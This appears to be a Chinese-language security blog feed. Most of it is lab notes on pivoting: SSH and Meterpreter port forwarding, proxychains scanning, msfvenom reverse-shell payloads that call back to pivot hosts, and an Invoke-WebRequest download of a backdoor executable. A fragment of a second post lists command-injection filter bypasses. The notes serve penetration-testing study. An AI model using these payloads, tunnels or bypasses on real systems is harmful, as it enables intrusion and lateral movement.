seconds</code></pre><p>Nmap输出显示SSH端口已打开。要访问MySQL服务，我们可以通过SSH连接到服务器并从Ubuntu服务器内部访问MySQL，也可以通过端口1234将其转发到本地主机并在本地访问。在本地访问它的一个好处是，如果我们想在MySQL服务上执行远程攻击，如果没有端口转发，我们将无法做到这一点。这是由于MySQL在端口3306的Ubuntu服务器上本地托管。因此，我们将使用以下命令通过SSH将本地端口（1234）转发到Ubuntu服务器。</p><h4 id="Executing-the-Local-Port-Forward"><a href="#Executing-the-Local-Port-Forward" class="headerlink" title="Executing the Local Port Forward"></a>Executing the Local Port Forward</h4><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antp | grep 1234</code></pre><h4 id="Confirming-Port-Forward-with-Nmap"><a href="#Confirming-Port-Forward-with-Nmap" class="headerlink" title="Confirming Port Forward with Nmap"></a>Confirming Port Forward with Nmap</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p1234 localhost</code></pre><p>类似地，如果我们想将多个端口从Ubuntu服务器转发到本地主机，可以通过在ssh命令中包含localport:server:port参数来实现。例如，下面的命令将apache web服务器的端口80转发到8080上的攻击主机的本地端口。</p><h4 id="Forwarding-Multiple-Ports"><a href="#Forwarding-Multiple-Ports" class="headerlink" title="Forwarding Multiple Ports"></a>Forwarding Multiple Ports</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64</code></pre><h2 id="Setting-up-to-Pivot"><a href="#Setting-up-to-Pivot" class="headerlink" title="Setting up to Pivot"></a>Setting up to Pivot</h2><p>现在，如果你在Ubuntu主机上键入ifconfig，你会发现这台服务器有多个NIC： 一个连接到我们的攻击主机（ens192） 一个与不同网络内的其他主机通信（ens224） 环回接口（lo）。</p><h4 id="Looking-for-Opportunities-to-Pivot-using-ifconfig"><a href="#Looking-for-Opportunities-to-Pivot-using-ifconfig" class="headerlink" title="Looking for Opportunities to Pivot using ifconfig"></a>Looking for Opportunities to Pivot using ifconfig</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ifconfig ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)        RX packets 35571  bytes 177919049 (177.9 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 10452  bytes 1474767 (1.4 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)        RX packets 8251  bytes 1125190 (1.1 MB)        RX errors 0  dropped 40  overruns 0  frame 0        TX packets 1538  bytes 123584 (123.5 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 270  bytes 22432 (22.4 KB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 270  bytes 22432 (22.4 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>与之前我们知道要访问哪个端口的情况不同，在当前的情况下，我们不知道网络的另一端有哪些服务。因此，我们可以扫描网络（172.16.5.1-200）网络或整个子网（172.16.5.0&#x2F;23）上较小范围的IP。我们无法直接从攻击主机执行此扫描，因为它没有到172.16.5.0&#x2F;22网络的路由。要做到这一点，我们必须通过Ubuntu服务器执行动态端口转发和调整网络数据包。我们可以通过在本地主机（个人攻击主机或Pwnbox）上启动SOCKS侦听器来实现这一点，然后配置SSH，以便在连接到目标主机后通过SSH将该流量转发到网络（172.16.5.0&#x2F;23）。 这称为通过SOCKS代理的SSH隧道。SOCKS代表Socket Secure，这是一种有助于与有防火墙限制的服务器通信的协议。与大多数情况下启动连接以连接到服务不同，在SOCKS的情况下，初始流量由SOCKS客户端生成，该客户端连接到由想要访问客户端上的服务的用户控制的SOCKS服务器。一旦建立了连接，就可以代表连接的客户端通过SOCKS服务器路由网络流量。 这种技术通常用于规避防火墙的限制，并允许外部实体绕过防火墙，访问防火墙环境中的服务。使用SOCKS代理进行数据透视和转发的另一个好处是，SOCKS代理可以通过创建从NAT网络到外部服务器的路由进行透视。SOCKS代理目前有两种类型：SOCKS4和SOCKS5。SOCKS4不提供任何身份验证和UDP支持，而SOCKS5提供了这些支持。让我们举一个下图的例子，我们有一个172.16.5.0&#x2F;23的NAT网络，我们不能直接访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291135490.png" alt="img"></p><p>在上图中，攻击主机启动SSH客户端，并请求SSH服务器允许其通过SSH套接字发送一些TCP数据。SSH服务器以确认进行响应，然后SSH客户端开始在localhost:9050上侦听。您在此处发送的任何数据都将通过SSH广播到整个网络（172.16.5.0&#x2F;23）。我们可以使用以下命令来执行此动态端口转发。</p><h4 id="Enabling-Dynamic-Port-Forwarding-with-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-with-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding with SSH"></a>Enabling Dynamic Port Forwarding with SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64</code></pre><p>-D参数请求SSH服务器启用动态端口转发。一旦我们启用了这一功能，我们将需要一个可以通过端口9050路由任何工具的数据包的工具。我们可以使用proxychains工具来实现这一点，该工具能够通过TOR、SOCKS和HTTP&#x2F;HTTPS代理服务器重定向TCP连接，还允许我们将多个代理服务器链接在一起。使用proxychains，我们也可以隐藏请求主机的IP地址，因为接收主机只能看到透视主机的IP。Proxychains通常用于强制应用程序的TCP流量通过托管代理，如SOCKS4&#x2F;SOCKS5、TOR或HTTP&#x2F;HTTPS代理。 要通知proxychans我们必须使用端口9050，我们必须修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans配置文件。如果最后一行还没有socks4 127.0.0.1 9050，那么我们可以将其添加到最后一行。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -4 /etc/proxychains.conf# meanwile# defaults set to &quot;tor&quot;socks4 127.0.0.1 9050</code></pre><p>现在，当您使用以下命令使用proxychains启动Nmap时，它将把Nmap的所有数据包路由到本地端口9050，我们的SSH客户端正在侦听该端口，该端口将通过SSH将所有数据包转发到172.16.5.0&#x2F;23网络。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200</code></pre><p>使用proxychains打包所有Nmap数据并将其转发到远程服务器的这一部分称为SOCKS隧道。这里需要记住的一个更重要的注意事项是，我们只能在proxychain上执行完整的TCP连接扫描。原因是代理主机无法理解部分数据包。如果发送部分数据包（如半连接扫描），则会返回不正确的结果。我们还需要确保意识到主机活动检查可能无法针对Windows目标，因为Windows Defender防火墙默认情况下会阻止ICMP请求（传统ping）。 在整个网络范围内不进行ping的完整TCP连接扫描将花费很长时间。因此，对于本模块，我们将主要关注扫描单个主机，或我们知道的活动的较小范围的主机，在这种情况下，它将是172.16.5.19的Windows主机。 我们将使用以下命令执行远程系统扫描。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19</code></pre><p>Nmap扫描显示了几个打开的端口，其中一个是RDP端口（3389）。与Nmap扫描类似，我们还可以通过proxychans调整msfconsole，使用Metasploit辅助模块执行易受攻击的RDP扫描。我们可以用proxychains启动msfconsole。</p><h2 id="Using-Metasploit-with-Proxychains"><a href="#Using-Metasploit-with-Proxychains" class="headerlink" title="Using Metasploit with Proxychains"></a>Using Metasploit with Proxychains</h2><p>我们还可以使用proxychains打开Metasploit，并通过我们建立的代理发送所有相关流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains msfconsole</code></pre><p>让我们使用rdp_scanner辅助模块来检查内部网络上的主机是否正在监听3389。</p><pre><code class="shell-session">msf6 &gt; search rdp_scannerrun：[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:INLANEFREIGHT) main_fqdn:inlanefreight.local) (server_fqdn:DC01.inlanefreight.local) (os_version:10.0.17763) (RequirNLA: No)[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>在上面输出的底部，我们可以看到RDP端口与Windows操作系统版本一起打开。 根据评估期间我们对此主机的访问级别，我们可能会尝试运行漏洞攻击或使用收集的凭据登录。对于此模块，我们将通过SOCKS隧道登录到Windows远程主机。这可以使用xfreerdp来完成。我们案例中的用户是胜利者，密码是pass@123</p><h4 id="Using-xfreerdp-with-Proxychains"><a href="#Using-xfreerdp-with-Proxychains" class="headerlink" title="Using xfreerdp with Proxychains"></a>Using xfreerdp with Proxychains</h4><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>应用本节中教授的概念，转向内部网络并使用RDP（凭据：victor:pass@123)以控制172.16.5.19上的Windows目标。提交桌面上Flag.txt的内容。</p><p>这里使用ssh -D 然后配置proxychain代理就可以轻松连接，个人感觉ssh -L也可以，但是缺陷是只能指定某个端口映射，这可能导致当常用服务与其常用端口不匹配时，转发出去的端口</p><h1 id="Remote-x2F-Reverse-Port-Forwarding-with-SSH"><a href="#Remote-x2F-Reverse-Port-Forwarding-with-SSH" class="headerlink" title="Remote&#x2F;Reverse Port Forwarding with SSH"></a>Remote&#x2F;Reverse Port Forwarding with SSH</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291509662.png" alt="img"></p><p>如果我们试图获得一个反向外壳，会发生什么呢？ Windows主机的传出连接仅限于172.16.5.0&#x2F;23网络。这是因为Windows主机与攻击主机所在的网络没有任何直接连接。如果我们在攻击主机上启动Metasploit侦听器并尝试获取反向shell，我们将无法在此处获得直接连接，因为Windows服务器不知道如何路由离开其网络（172.16.5.0&#x2F;23）的流量以到达10.129.x.x（Academy Lab网络）。 在渗透测试过程中，有几次只有远程桌面连接是不可行的。您可能需要上载&#x2F;下载文件（当RDP剪贴板被禁用时），使用漏洞利用或低级Windows API使用Metermeter会话在Windows主机上执行枚举，而使用内置的Windows可执行文件是不可能的。 在这些情况下，我们必须找到一个枢轴主机，这是我们的攻击主机和Windows服务器之间的常见连接点。在我们的案例中，我们的中枢主机将是Ubuntu服务器，因为它可以连接到我们的攻击主机和Windows目标。为了在Windows上获得Meterpeter外壳，我们将使用msfvenom创建MeterpeterHTTPS负载，但负载的反向连接配置为Ubuntu服务器的主机IP地址（172.16.5.129）。我们将使用Ubuntu服务器上的端口8080将所有反向数据包转发到攻击主机的8000端口，Metasploit侦听器正在该端口运行。</p><h4 id="Creating-a-Windows-Payload-with-msfvenom"><a href="#Creating-a-Windows-Payload-with-msfvenom" class="headerlink" title="Creating a Windows Payload with msfvenom"></a>Creating a Windows Payload with msfvenom</h4><pre><code class="shell-session"> msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 8000lport =&gt; 8000msf6 exploit(multi/handler) &gt; run[*] Started HTTPS reverse handler on https://0.0.0.0:8000</code></pre><p>一旦创建了有效负载，并且配置并运行了侦听器，我们就可以使用scp命令将有效负载复制到Ubuntu服务器，因为我们已经有了使用SSH连接到Ubuntu服务器的凭据。</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/backupscript.exe                                   100% 7168    65.4KB/s   00:00 </code></pre><p>复制有效负载后，我们将在复制有效负载的同一目录中的Ubuntu服务器上使用以下命令启动python3HTTP服务器。</p><h4 id="Starting-Python3-Webserver-on-Pivot-Host"><a href="#Starting-Python3-Webserver-on-Pivot-Host" class="headerlink" title="Starting Python3 Webserver on Pivot Host"></a>Starting Python3 Webserver on Pivot Host</h4><pre><code class="shell-session">ubuntu@Webserver$ python3 -m http.server 8123</code></pre><h4 id="Downloading-Payload-from-Windows-Target"><a href="#Downloading-Payload-from-Windows-Target" class="headerlink" title="Downloading Payload from Windows Target"></a>Downloading Payload from Windows Target</h4><p>我们可以通过web浏览器或PowerShell cmdlet Invoke-WebRequest从Windows主机下载此备份脚本.exe。</p><pre><code class="powershell-session">PS C:\Windows\system32&gt; Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></pre><p>一旦我们在Windows主机上下载了负载，我们将使用SSH远程端口转发将msfconsole在8000端口上的侦听器服务转发到Ubuntu服务器的8080端口。我们将在SSH命令中使用-vN参数，使其变得详细，并要求它不要提示登录shell。-R命令要求Ubuntu服务器侦听<targetIPaddress>:8080，并将端口8080上的所有传入连接转发到我们攻击主机0.0.0.0:8000上的msfconsole侦听器。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></pre><p>在创建SSH远程端口转发后，我们可以从Windows目标执行负载。如果有效负载按预期执行并尝试连接回侦听器，我们可以在pivot主机上看到来自pivot的日志。</p><p>如果一切设置正确，我们将通过Ubuntu服务器收到一个Meterpeter shell。</p><h4 id="Meterpreter-Session-Established"><a href="#Meterpreter-Session-Established" class="headerlink" title="Meterpreter Session Established"></a>Meterpreter Session Established</h4><pre><code class="shell-session">[*] Started HTTPS reverse handler on https://0.0.0.0:8000[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] Meterpreter session 1 opened (127.0.0.1:8000 -&gt; 127.0.0.1 ) at 2022-03-02 10:48:10 -0500meterpreter &gt; shellProcess 3236 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre><p>Meterpeter会话应该列出我们的传入连接来自本地主机本身（127.0.0.1），因为我们通过本地SSH套接字接收连接，该套接字创建了到Ubuntu服务器的出站连接。发出netstat命令可以向我们显示传入连接来自SSH服务。 下面的图形表示提供了理解该技术的另一种方式。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291516188.png" alt="img"></p><pre><code class="powershell-session"> Invoke-WebRequest -Uri &quot;http://10.129.147.31:8123/backdoor.exe&quot; -OutFile &quot;C:\backdoor&quot;</code></pre><h1 id="Meterpreter-Tunneling-amp-Port-Forwarding"><a href="#Meterpreter-Tunneling-amp-Port-Forwarding" class="headerlink" title="Meterpreter Tunneling &amp; Port Forwarding"></a>Meterpreter Tunneling &amp; Port Forwarding</h1><h4 id="Creating-Payload-for-Ubuntu-Pivot-Host"><a href="#Creating-Payload-for-Ubuntu-Pivot-Host" class="headerlink" title="Creating Payload for Ubuntu Pivot Host"></a>Creating Payload for Ubuntu Pivot Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</code></pre><p>在复制有效负载之前，我们可以启动一个 <a href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi&#x2F;handler</a>，也称为GenericPayloadHandler。</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler</code></pre><p>我们可以通过SSH将备份作业二进制文件复制到Ubuntu pivot主机，并执行它以获得Meterpeter会话。</p><p>我们需要确保在执行有效载荷时成功建立MeterMeter会话。</p><h4 id="Meterpreter-Session-Establishment"><a href="#Meterpreter-Session-Establishment" class="headerlink" title="Meterpreter Session Establishment"></a>Meterpreter Session Establishment</h4><p>我们知道Windows目标位于172.16.5.0&#x2F;23网络上。因此，假设Windows目标上的防火墙允许ICMP请求，我们希望在此网络上执行ping扫描。我们可以使用带有ping_sweep模块的Meterpeter来实现这一点，该模块将生成从Ubuntu主机到网络的ICMP流量172.16.5.0&#x2F;23。</p><h4 id="Ping-Sweep"><a href="#Ping-Sweep" class="headerlink" title="Ping Sweep"></a>Ping Sweep</h4><pre><code class="shell-session">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23[*] Performing ping sweep for IP range 172.16.5.0/23</code></pre><p>我们还可以直接在目标枢轴主机上使用for循环执行ping扫描，该主机将ping我们指定的网络范围内的任何设备。这里有两个有用的ping扫描循环一行，我们可以用于基于Linux和基于Windows的枢轴主机。</p><pre><code class="shell-session">for i in &#123;1..254&#125; ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done</code></pre><pre><code class="cmd-session">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</code></pre><pre><code class="powershell-session">1..254 | % &#123;&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;&#125;</code></pre><p>注意：ping扫描可能不会在第一次尝试时成功回复，尤其是在跨网络通信时。这可能是由主机构建其arp缓存所需的时间造成的。在这些情况下，最好尝试至少两次ping扫描，以确保构建arp缓存。</p><p>在某些情况下，主机的防火墙会阻止ping（ICMP），而ping不会成功回复我们。在这些情况下，我们可以使用Nmap在172.16.5.0&#x2F;23网络上执行TCP扫描。我们还可以使用Metasploit的漏洞利用后路由模块socks_proxy在攻击主机上配置本地代理，而不是使用SSH进行端口转发。我们将为SOCKS版本4a配置SOCKS代理。此SOCKS配置将在端口9050上启动一个侦听器，并路由通过MeterMeter会话接收的所有流量。</p><h4 id="Configuring-MSF’s-SOCKS-Proxy"><a href="#Configuring-MSF’s-SOCKS-Proxy" class="headerlink" title="Configuring MSF’s SOCKS Proxy"></a>Configuring MSF’s SOCKS Proxy</h4><pre><code class="shell-session">msf6 &gt; use auxiliary/server/socks_proxy</code></pre><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050SRVPORT =&gt; 9050msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0SRVHOST =&gt; 0.0.0.0msf6 auxiliary(server/socks_proxy) &gt; set version 4aversion =&gt; 4amsf6 auxiliary(server/socks_proxy) &gt; run[*] Auxiliary module running as background job 0.[*] Starting the SOCKS proxy servermsf6 auxiliary(server/socks_proxy) &gt; optionsModule options (auxiliary/server/socks_proxy):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SRVHOST  0.0.0.0          yes       The address to listen on   SRVPORT  9050             yes       The port to listen on   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,                                        5)Auxiliary action:   Name   Description   ----   -----------   Proxy  Run a SOCKS proxy server</code></pre><h4 id="Confirming-Proxy-Server-is-Running"><a href="#Confirming-Proxy-Server-is-Running" class="headerlink" title="Confirming Proxy Server is Running"></a>Confirming Proxy Server is Running</h4><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; jobsJobs====  Id  Name                           Payload  Payload opts  --  ----                           -------  ------------  0   Auxiliary: server/socks_proxy</code></pre><p>在启动SOCKS服务器后，我们将配置proxychans，通过我们在受损的Ubuntu主机上的枢轴来路由其他工具（如Nmap）生成的流量。如果还没有，我们可以在&#x2F;etc&#x2F;proxychain.conf的proxychain.onf文件的末尾添加以下行。</p><pre><code class="shell-session">socks4 127.0.0.1 9050</code></pre><p>注意：根据SOCKS服务器运行的版本，我们可能偶尔需要在proxyains.conf中将socks4更改为socks5。</p><h4 id="Creating-Routes-with-AutoRoute"><a href="#Creating-Routes-with-AutoRoute" class="headerlink" title="Creating Routes with AutoRoute"></a>Creating Routes with AutoRoute</h4><pre><code class="shell-session">msf6 &gt; use post/multi/manage/autoroutemsf6 post(multi/manage/autoroute) &gt; set SESSION 1SESSION =&gt; 1msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0SUBNET =&gt; 172.16.5.0msf6 post(multi/manage/autoroute) &gt; run</code></pre><p>也可以通过从MeterMeter会话运行自动路由来添加具有自动路由的路由。</p><pre><code class="shell-session">meterpreter &gt; run autoroute -s 172.16.5.0/23</code></pre><p>添加必要的路由后，我们可以使用-p选项列出活动路由，以确保我们的配置按预期应用。</p><pre><code class="shell-session">meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Active Routing Table====================   Subnet             Netmask            Gateway   ------             -------            -------   10.129.0.0         255.255.0.0        Session 1   172.16.4.0         255.255.254.0      Session 1   172.16.5.0         255.255.254.0      Session 1</code></pre><p>从上面的输出中可以看出，该路由已添加到172.16.5.0&#x2F;23网络中。我们现在可以使用proxychans通过MeterMeter会话路由我们的Nmap流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</code></pre><h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>端口转发也可以使用Meterpeter的portfwd模块来完成。我们可以在我们的攻击主机上启用侦听器，并请求Meterpeter通过Metermeter会话将在该端口上接收到的所有数据包转发到172.16.5.0&#x2F;23网络上的远程主机。</p><pre><code class="shell-session">meterpreter &gt; help portfwdUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS:</code></pre><h4 id="Creating-Local-TCP-Relay"><a href="#Creating-Local-TCP-Relay" class="headerlink" title="Creating Local TCP Relay"></a>Creating Local TCP Relay</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19</code></pre><p>上述命令请求Metereter会话在我们的攻击主机的本地端口（-l）3300上启动一个侦听器，并通过我们的Meter会话将所有数据包转发到3389端口（-p）上的远程（-r）Windows服务器172.16.5.19。现在，如果我们在localhost:3300上执行xfreerdp，我们将能够创建一个远程桌面会话。</p><h4 id="Connecting-to-Windows-Target-through-localhost"><a href="#Connecting-to-Windows-Target-through-localhost" class="headerlink" title="Connecting to Windows Target through localhost"></a>Connecting to Windows Target through localhost</h4><pre><code class="shell-session">Tanin@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></pre><h4 id="Netstat-Output"><a href="#Netstat-Output" class="headerlink" title="Netstat Output"></a>Netstat Output</h4><p>我们可以使用Netstat来查看有关我们最近建立的会话的信息。从防御的角度来看，如果我们怀疑主机被破坏，我们可能会从使用Netstat中受益。这使我们能够查看主机建立的任何会话。</p><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antptcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp </code></pre><hr><h2 id="Meterpreter-Reverse-Port-Forwarding"><a href="#Meterpreter-Reverse-Port-Forwarding" class="headerlink" title="Meterpreter Reverse Port Forwarding"></a>Meterpreter Reverse Port Forwarding</h2><p>与本地端口转发类似，Metasploit也可以使用以下命令执行反向端口转发，您可能希望监听受损服务器上的特定端口，并将所有来自Ubuntu服务器的shell转发到我们的攻击主机。我们将在Windows攻击主机的新端口上启动一个侦听器，并请求Ubuntu服务器将在端口1234上接收到的所有请求转发到我们在端口8081上的侦听器。 我们可以使用下面的命令在前面的场景中的现有shell上创建反向端口转发。该命令将Ubuntu服务器上运行的1234端口上的所有连接转发到本地端口（-l）8081上的攻击主机。我们还将配置我们的侦听器，以便在Windows外壳的8081端口上侦听。</p><h4 id="Reverse-Port-Forwarding-Rules"><a href="#Reverse-Port-Forwarding-Rules" class="headerlink" title="Reverse Port Forwarding Rules"></a>Reverse Port Forwarding Rules</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234</code></pre><h4 id="Configuring-amp-Starting-multi-x2F-handler"><a href="#Configuring-amp-Starting-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting multi&#x2F;handler"></a>Configuring &amp; Starting multi&#x2F;handler</h4><pre><code class="shell-session">meterpreter &gt; bg[*] Backgrounding session 1...msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LPORT 8081 LPORT =&gt; 8081msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 LHOST =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 0.0.0.0:8081 </code></pre><p>我们现在可以创建一个反向shell负载，当在Windows主机上执行时，该负载将在172.16.5.129:1234上将连接发送回我们的Ubuntu服务器。一旦我们的Ubuntu服务器接收到这个连接，它就会转发这个连接来攻击我们配置的主机的ip:8081。</p><h4 id="Establishing-the-Meterpreter-session"><a href="#Establishing-the-Meterpreter-session" class="headerlink" title="Establishing the Meterpreter session"></a>Establishing the Meterpreter session</h4><pre><code class="shell-session">[*] Started reverse TCP handler on 0.0.0.0:8081 [*] Sending stage (200262 bytes) to 10.10.14.18[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500meterpreter &gt; shellProcess 2336 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Introduction-to-Pivoting-Tunneling-and-Port-Forwarding&quot;&gt;&lt;a href=&quot;#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding&quot; class=&quot;headerlink&quot; title=&quot;Introduction to Pivoting, Tunneling, and Port Forwarding&quot;&gt;&lt;/a&gt;Introduction to Pivoting, Tunneling, and Port Forwarding&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>command injections</title>
    <link href="https://taninluv.github.io/2023/08/24/command-injections/"/>
    <id>https://taninluv.github.io/2023/08/24/command-injections/</id>
    <published>2023-08-24T09:53:07.000Z</published>
    <updated>2023-08-27T08:11:45.391Z</updated>
    
    <content type="html"><![CDATA[<p>检测基本操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们试图通过各种注入方法附加我们的命令。如果命令输出与预期的通常结果不同，则我们已成功利用该漏洞。对于更高级的命令注入漏洞，情况可能并非如此，因为我们可能会利用各种模糊方法或代码审查来识别潜在的命令注入弱点。然后，我们可以逐步构建我们的有效载荷，直到我们实现命令注入。</p><span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Filtered-Character-Bypass"><a href="#Filtered-Character-Bypass" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>printenv</code></td><td>Can be used to view all environment variables</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>$&#123;IFS&#125;</code></td><td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td></tr><tr><td><code>&#123;ls,-la&#125;</code></td><td>Commas will be replaced with spaces</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>$&#123;PATH:0:1&#125;</code></td><td>Will be replaced with <code>/</code></td></tr><tr><td><code>$&#123;LS_COLORS:10:1&#125;</code></td><td>Will be replaced with <code>;</code></td></tr><tr><td><code>$(tr &#39;!-&#125;&#39; &#39;&quot;-~&#39;&lt;&lt;&lt;[)</code></td><td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass"><a href="#Blacklisted-Command-Bypass" class="headerlink" title="Blacklisted Command 